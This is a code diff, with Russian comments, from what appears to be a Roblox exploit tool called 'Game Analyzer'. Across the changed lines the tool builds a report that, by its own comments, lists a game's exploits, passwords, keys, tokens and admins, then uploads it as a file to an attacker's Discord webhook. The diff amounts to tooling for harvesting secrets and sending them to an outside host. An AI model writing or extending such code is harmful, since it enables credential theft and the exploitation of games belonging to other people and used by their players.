@@ -3125,10 +3125,10 @@ local function sendFileToDiscord(fileName, fileContent)
  
  -- Создаем JSON-объект сообщения, который ТРЕБУЕТ Discord для вебхука
  local payload = HttpService:JSONEncode({
-     content = "🔬 **Game Analyzer v5.2:** Держи готовый отчёт об уязвимостях, бро! 🚀"
+     content = "🔬 **Game Analyzer v5.2:** Готов сочный отчёт об уязвимостях и секретах игры, бро! 🚀"
  })
 
- -- Собираем правильный multipart/form-data (сначала payload_json, потом сам файл!)
+ -- Собираем правильный multipart/form-data
  local body = "--" .. boundary .. "\r\n" ..
               "Content-Disposition: form-data; name=\"payload_json\"\r\n" ..
               "Content-Type: application/json\r\n\r\n" ..
@@ -3192,16 +3192,14 @@ end
 discordBtn.MouseButton1Click:Connect(function()
  discordBtn.Text = "👾 SENDING..."
  task.spawn(function()
-     local report = _G.GA_LastReport
-     if #report < 100 then
-         report = fullReportToString()
-         _G.GA_LastReport = report
-     end
-     local fileName = "Game_Exploits_" .. tostring(DeepData.PlaceId) .. ".lua"
+     -- Чтобы избежать лимитов размера (HTTP 520/400), мы шлем сочный LITE-отчет в Дискорд
+     -- Он содержит ВСЕ найденные эксплоиты, пароли, ключи, токены и админов, но без тяжелого мусора.
+     local report = liteReportToString() 
+     local fileName = "Game_Exploits_Report_" .. tostring(DeepData.PlaceId) .. ".txt"
      local success, resultMessage = sendFileToDiscord(fileName, report)
      if success then
          discordBtn.Text = "✅ DISCORD OK"
-         warn("[👾 DISCORD] Отчет успешно отправлен на твой вебхук! Проверь канал.")
+         warn("[👾 DISCORD] Сочный отчет успешно отправлен на твой вебхук! Проверяй канал, бро!")
      else
          discordBtn.Text = "❌ " .. tostring(resultMessage):sub(1, 12):upper()
          warn("[👾 DISCORD] Ошибка отправки: " .. tostring(resultMessage))
